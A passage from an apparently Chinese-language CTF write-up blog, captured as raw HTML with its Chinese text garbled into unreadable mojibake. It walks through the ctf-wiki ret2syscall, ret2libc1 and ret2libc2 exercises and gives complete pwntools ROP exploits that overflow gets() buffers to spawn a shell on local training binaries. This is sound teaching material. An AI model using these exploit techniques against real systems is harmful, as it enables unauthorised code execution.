class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2syscall]<span class="hljs-comment"># ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br>0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x080bb196 : pop eax ; ret<br>0x0807217a : pop eax ; ret 0x80e<br>0x0804f704 : pop eax ; ret 3<br>0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>[root@ningan ret2syscall]<span class="hljs-comment">#</span><br>[root@ningan ret2syscall]<span class="hljs-comment"># ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br>0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret<br>0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret<br>0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret<br>0x080be23f : pop ebx ; pop edi ; ret<br>0x0806eb69 : pop ebx ; pop edx ; ret<br>0x08092258 : pop ebx ; pop esi ; pop ebp ; ret<br>0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10<br>0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14<br>0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc<br>0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4<br>0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8<br>0x08048913 : pop ebx ; pop esi ; pop edi ; ret<br>0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4<br>0x08049a94 : pop ebx ; pop esi ; ret<br>0x080481c9 : pop ebx ; ret<br>0x080d7d3c : pop ebx ; ret 0x6f9<br>0x08099c87 : pop ebx ; ret 8<br>0x0806eb91 : pop ecx ; pop ebx ; ret<br>0x0806336b : pop edi ; pop esi ; pop ebx ; ret<br>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret<br>0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret<br>0x0805c820 : pop esi ; pop ebx ; ret<br>0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x0807b6ed : pop ss ; pop ebx ; ret<br>[root@ningan ret2syscall]<span class="hljs-comment">#</span><br>[root@ningan ret2syscall]<span class="hljs-comment">#</span><br>[root@ningan ret2syscall]<span class="hljs-comment">#</span><br>[root@ningan ret2syscall]<span class="hljs-comment"># ROPgadget --binary rop  --string &#x27;/bin/sh&#x27;</span><br>Strings information<br>============================================================<br>0x080be408 : /bin/sh<br>[root@ningan ret2syscall]<span class="hljs-comment">#</span><br>[root@ningan ret2syscall]<span class="hljs-comment">#</span><br>[root@ningan ret2syscall]<span class="hljs-comment"># ROPgadget --binary rop  --only &#x27;int&#x27;</span><br>Gadgets information<br>============================================================<br>0x08049421 : int 0x80<br><br>Unique gadgets found: 1<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821202913.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821202946.png" alt="image.png"></p><h2 id="è§£é¢˜æ€è·¯-1"><a href="#è§£é¢˜æ€è·¯-1" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>æ­¤æ¬¡ï¼Œç”±äºæˆ‘ä»¬ä¸èƒ½ç›´æ¥åˆ©ç”¨ç¨‹åºä¸­çš„æŸä¸€æ®µä»£ç æˆ–è€…è‡ªå·±å¡«å†™ä»£ç æ¥è·å¾— shellï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ç¨‹åºä¸­çš„ gadgets æ¥è·å¾— shellï¼Œè€Œå¯¹åº”çš„ shell è·å–åˆ™æ˜¯åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨ã€‚</p><p>ç®€å•åœ°è¯´ï¼Œåªè¦æˆ‘ä»¬æŠŠå¯¹åº”è·å– shell çš„ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æ”¾åˆ°å¯¹åº”çš„å¯„å­˜å™¨ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨æ‰§è¡Œ int 0x80 å°±å¯æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ã€‚æ¯”å¦‚è¯´è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨å¦‚ä¸‹ç³»ç»Ÿè°ƒç”¨æ¥è·å– shell</p><p><code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p><p>å…¶ä¸­ï¼Œè¯¥ç¨‹åºæ˜¯ 32 ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿å¾—</p><ul><li>ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³ eax åº”è¯¥ä¸º 0xb</li><li>ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ ebx åº”è¯¥æŒ‡å‘ &#x2F;bin&#x2F;sh çš„åœ°å€ï¼Œå…¶å®æ‰§è¡Œ sh çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚</li><li>ç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ ecx åº”è¯¥ä¸º 0</li><li>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³ edx åº”è¯¥ä¸º 0</li></ul><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">é»˜è®¤æ ˆå¸§<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     retaddr     </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     saved ebp   </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                     v4---&gt;+-----------------+<br><br>ä¿®æ”¹åæ ˆå¸§<br>                                           +-----------------+<br>                                           |<span class="hljs-string">    0x80_addr    </span>|<br>                                           +-----------------+                                           <br>                                           |<span class="hljs-string">  /bin/sh_addr   </span>|<br>                                           +-----------------+                                           <br>                                           |<span class="hljs-string">        0        </span>|<br>                                           +-----------------+                                           <br>                                           |<span class="hljs-string">        0        </span>|<br>                                           +-----------------+                                           <br>                                           |<span class="hljs-string">pop_edx_ecx_ebx_ret_addr </span>|<br>                                           +-----------------+                                        <br>                                           |<span class="hljs-string">       0xb       </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">    (retaddr)    </span>|<br>                                           |<span class="hljs-string">pop_eax_ret_addr </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">   (saved ebp)   </span>|<br>                                           |<span class="hljs-string">       BBBBB     </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">   AAA...AAAA    </span>|<br>                                           |<span class="hljs-string">     108ä½       </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                     v4---&gt;+-----------------+<br></code></pre></td></tr></table></figure><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/env python</span><br>from pwn import *<br><br>sh = process(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br><br>pop_eax_ret = 0x080bb196<br>pop_edx_ecx_ebx_ret = 0x0806eb90<br>int_0x80 = 0x08049421<br>binsh = 0x80be408<br><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])<br><br>sh.sendline(payload)<br>sh.interactive()<br><br><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">[root@ningan ret2syscall]# python exp.py</span><br><span class="hljs-string">[+] Starting local process &#x27;./rop&#x27;: pid 24853</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">This time, no system() and NO SHELLCODE!!!</span><br><span class="hljs-string">What do you plan to do?</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">exp.py    rop</span><br><span class="hljs-string">$</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode">ctfwifiå®˜æ–¹ ret2shellcode</a></p><h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><h2 id="æ£€æŸ¥-1"><a href="#æ£€æŸ¥-1" class="headerlink" title="æ£€æŸ¥"></a>æ£€æŸ¥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2libc1]<span class="hljs-comment"># file ret2libc1</span><br>ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped<br>[root@ningan ret2libc1]<span class="hljs-comment">#</span><br>[root@ningan ret2libc1]<span class="hljs-comment"># checksec ret2libc1</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfwiki/ret2libc1/ret2libc1&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br><br></code></pre></td></tr></table></figure><h2 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾systemå‡½æ•°çš„åœ°å€</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">.plt:<span class="hljs-number">08048460</span>                               ; <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *command)</span></span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822163544.png" alt="image.png"></p><p>æŸ¥æ‰¾&#x2F;bin&#x2F;shå­—ç¬¦ä¸²çš„åœ°å€</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.rodata:<span class="hljs-number">08048720</span><span class="hljs-number">00000008</span>C<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822163657.png" alt="image.png"></p><h2 id="è§£é¢˜æ€è·¯-2"><a href="#è§£é¢˜æ€è·¯-2" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>è¿™ä¸ªä¾‹å­ç›¸å¯¹æ¥è¯´ç®€å•ï¼ŒåŒæ—¶æä¾›äº† system åœ°å€ä¸ &#x2F;bin&#x2F;sh çš„åœ°å€</p><p>å¦‚æœæ˜¯æ­£å¸¸è°ƒç”¨ system å‡½æ•°ï¼Œæˆ‘ä»¬è°ƒç”¨çš„æ—¶å€™ä¼šæœ‰ä¸€ä¸ªå¯¹åº”çš„è¿”å›åœ°å€ï¼Œè¿™é‡Œä»¥â€™4ä½åƒåœ¾æ•°æ®â€™ ä½œä¸ºè™šå‡çš„åœ°å€ï¼Œå…¶åå‚æ•°å¯¹åº”çš„å‚æ•°å†…å®¹ã€‚</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">é»˜è®¤æ ˆå¸§<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     retaddr     </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     saved ebp   </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                     v4---&gt;+-----------------+<br><br>ä¿®æ”¹åæ ˆå¸§<br><br>                                           +-----------------+                                           <br>                                           |<span class="hljs-string">    binsh_addr   </span>|<br>                                           +-----------------+                                        <br>                                           |<span class="hljs-string">    4ä½åƒåœ¾æ•°æ®   </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">    (retaddr)    </span>|<br>                                           |<span class="hljs-string"> system_plt_addr </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">   (saved ebp)   </span>|<br>                                           |<span class="hljs-string">      BBBBB      </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">   AAA...AAAA    </span>|<br>                                           |<span class="hljs-string">     108ä½       </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                     v4---&gt;+-----------------+<br></code></pre></td></tr></table></figure><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc1&#x27;</span>)<br><br>binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">108</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">4</span>, system_plt, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">4</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[root@ningan ret2libc1]# python exp.py</span><br><span class="hljs-string">[+] Starting local process &#x27;./ret2libc1&#x27;: pid 738</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">RET2LIBC &gt;_&lt;</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">exp.py    ret2libc1</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h1><h2 id="æ£€æŸ¥-2"><a href="#æ£€æŸ¥-2" class="headerlink" title="æ£€æŸ¥"></a>æ£€æŸ¥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2libc2]<span class="hljs-comment"># file ret2libc2</span><br>ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped<br>[root@ningan ret2libc2]<span class="hljs-comment">#</span><br>[root@ningan ret2libc2]<span class="hljs-comment"># checksec ret2libc2</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfwiki/ret2libc2/ret2libc2&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br><br></code></pre></td></tr></table></figure><h2 id="idaåˆ†æ-3"><a href="#idaåˆ†æ-3" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What do you think ?&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822165237.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæœ‰systemçš„pltå‡½æ•°ï¼Œå¦‚ä¸Šå›¾ï¼›ä½†æ˜¯æ²¡æœ‰&#x2F;bin&#x2F;shå­—ç¬¦ä¸²ï¼Œå¦‚ä¸‹å›¾</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822165309.png" alt="image.png"></p><h2 id="ROPgadgetåˆ†æ-1"><a href="#ROPgadgetåˆ†æ-1" class="headerlink" title="ROPgadgetåˆ†æ"></a>ROPgadgetåˆ†æ</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822165352.png" alt="image.png"></p><p>è¿™ä¸ªå·¥å…·ä¹Ÿçœ‹åˆ°æ²¡æœ‰&#x2F;bin&#x2F;shå­—ç¬¦ä¸²</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822165433.png" alt="image.png"></p><h2 id="æŸ¥çœ‹bssæ˜¯å¦å¯ä»¥å†™å…¥"><a href="#æŸ¥çœ‹bssæ˜¯å¦å¯ä»¥å†™å…¥" class="headerlink" title="æŸ¥çœ‹bssæ˜¯å¦å¯ä»¥å†™å…¥"></a>æŸ¥çœ‹bssæ˜¯å¦å¯ä»¥å†™å…¥</h2><h3 id="idaåˆ†æ-4"><a href="#idaåˆ†æ-4" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>bssæ®µçš„å¤§æ¦‚ä½ç½®ä¸ºï¼š0804A040-&gt;0804A040ï¼Œå¹¶ä¸”0x0804A040å¤„æœ‰ä¸€ä¸ªå¯ä»¥å†™å…¥çš„åœ°æ–¹(buf2å˜é‡)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230829232552.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230829234320.png" alt="image.png"></p><p>getå‡½æ•°çš„åœ°å€ä¸ºï¼š0x08048460 </p><h3 id="gdbåˆ†æ-2"><a href="#gdbåˆ†æ-2" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">gdb   ret2libc2<br><span class="hljs-selector-tag">b</span> <span class="hljs-selector-tag">main</span><br>r<br>vmmap<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230829232512.png" alt="image.png"><br>å¯ä»¥çœ‹åˆ°ï¼Œbssæ®µæ˜¯å¯å†™çš„</p><h3 id="ROPgadgetåˆ†æ-2"><a href="#ROPgadgetåˆ†æ-2" class="headerlink" title="ROPgadgetåˆ†æ"></a>ROPgadgetåˆ†æ</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230829234048.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2libc2]<span class="hljs-comment"># ROPgadget --binary ret2libc2  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br>[root@ningan ret2libc2]<span class="hljs-comment">#</span><br>[root@ningan ret2libc2]<span class="hljs-comment">#</span><br>[root@ningan ret2libc2]<span class="hljs-comment"># ROPgadget --binary ret2libc2  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br>0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x0804843d : pop ebx ; ret<br>[root@ningan ret2libc2]<span class="hljs-comment"># ROPgadget --binary ret2libc2  --only &#x27;pop|ret&#x27; | grep &#x27;ecx&#x27;</span><br>[root@ningan ret2libc2]<span class="hljs-comment"># ROPgadget --binary ret2libc2  --only &#x27;pop|ret&#x27; | grep &#x27;edx&#x27;</span><br><br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°pop_ebx_retçš„åœ°å€ä¸ºï¼š0x0804843d</p><h2 id="ï¼ï¼ï¼é‡ç‚¹æ€è·¯ï¼ï¼ï¼"><a href="#ï¼ï¼ï¼é‡ç‚¹æ€è·¯ï¼ï¼ï¼" class="headerlink" title="ï¼ï¼ï¼é‡ç‚¹æ€è·¯ï¼ï¼ï¼"></a>ï¼ï¼ï¼é‡ç‚¹æ€è·¯ï¼ï¼ï¼</h2><p>ä»£ç ä¸­ç›´æ¥æœ‰systemçš„pltåœ°å€ï¼Œä½†æ˜¯æ²¡æœ‰&#x2F;bin&#x2F;shå­—ç¬¦ä¸²<br>è¿™é‡Œå°±å¯ä»¥è°ƒç”¨getå‡½æ•°æ¥è®©æˆ‘ä»¬è¾“å…¥&#x2F;bin&#x2F;sh ç„¶ååœ¨è®©systemè¿”å›åˆ°æˆ‘ä»¬è¾“å…¥çš„åœ°æ–¹<br>å“ªé‡Œå¯ä»¥è¾“å…¥å‘¢ï¼ŸæŸ¥æ‰¾bssæ®µæ˜¯å¦æœ‰å¯ä»¥è¾“å…¥çš„åœ°æ–¹<br>å‘ç°bssæ®µæœ‰ä¸€ä¸ªbufå˜é‡ï¼Œè€Œä¸”bssæ®µæ˜¯å¯å†™çš„<br>è°ƒç”¨getå‡½æ•°å†™ä¸€ä¸ª&#x2F;bin&#x2F;shè¿›å»ï¼ŒæŠŠè¿™ä¸ªå†™è¿›å»çš„å­—ç¬¦ä¸²å½“æˆsystemçš„å‡½æ•°æ¥æ‰§è¡Œå³å¯~</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br>get_add=<span class="hljs-number">0x08048460</span><br>sys_add=<span class="hljs-number">0x08048490</span><br>buf2_add=<span class="hljs-number">0x0804A080</span><br>payload=flat([<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span>,get_add,sys_add,buf2_add,buf2_add])<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831194630.png" alt="image.png"></p><h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 